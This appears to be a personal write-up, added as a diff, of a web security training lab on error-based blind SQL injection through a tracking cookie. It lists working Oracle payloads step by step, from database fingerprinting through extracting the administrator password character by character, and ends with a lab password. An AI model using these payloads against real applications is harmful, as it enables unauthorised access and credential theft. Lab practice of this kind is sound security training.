@@ -1,0 +1,79 @@
+Vulnerable parameter - Tracking cookie
+
+Goals:
+1- Display the password of the administrator.
+2- Log in as the administrator user.
+
+Analysis:
+--------
+
+Step #1: Confirm that the parameter is vulnerable to blind SQL injection
+' -> error
+'' -> 200 response
+' || (SELECT '') || ' -> error -> the database is not MySQL nor Microsoft
+' || (SELECT '' FROM DUAL) || ' -> 200 response -> Oracle database
+
+' || (SELECT '' FROM DUALasdlkfja;slkdjf) || ' -> error
+
+The query is vulnerable to blind SQL injection
+
+Step #2: Confirm that the users table exist
+' || (SELECT '' FROM users) || ' -> error
+
+' || (SELECT '' FROM users WHERE rownum = 1) 
+-> 200 response -> users table exist
+
+Step #3: Confirm that username administrator exists in users table
+' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
+-> 200 response 
+note: TO_CHAR change the number data type to string 
+note: This query (CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END) is like (if 1=1: print(1\0) else: print(''))
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') || '
+-> error -> the username administrator exist
+
+-> error -> the username exist
+-> 200 response -> the username doesn't exist
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'randomusername') || '
+-> 200 response -> the username doesn't exist
+
+
+Step #4: Determine the length of the administrator password
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > 1) || '
+-> error -> the password is greater than 1
+
+note: You could use the Intruder from Burp Suite to do this or script it
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > 10) || '
+-> error -> the password is greater than 10
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > 15) || '
+-> error -> the password is greater than 15
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > 20) || '
+-> 200 response -> the length of the password is less than or equal to 20
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) = 20) || '
+-> error -> the length of the password is 20
+
+Step #5: Display the administrator password
+first character = 'a' 
+-> error -> the first character is 'a'
+-> 200 response -> the first character is not 'a'
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND SUBSTR(password, 1, 1) = 'a') || '
+
+-> error -> the first character is 'a'
+-> 200 response -> the first character is not 'a'
+
+Do this until you find all the characters in the password
+
+note: You could use the Intruder from Burp Suite to do this or script it
+
+Step #6: Log in as the administrator user
+
+Username: administrator
+Password: 5f178k5o6qgb02okcfzn
+
+Solved
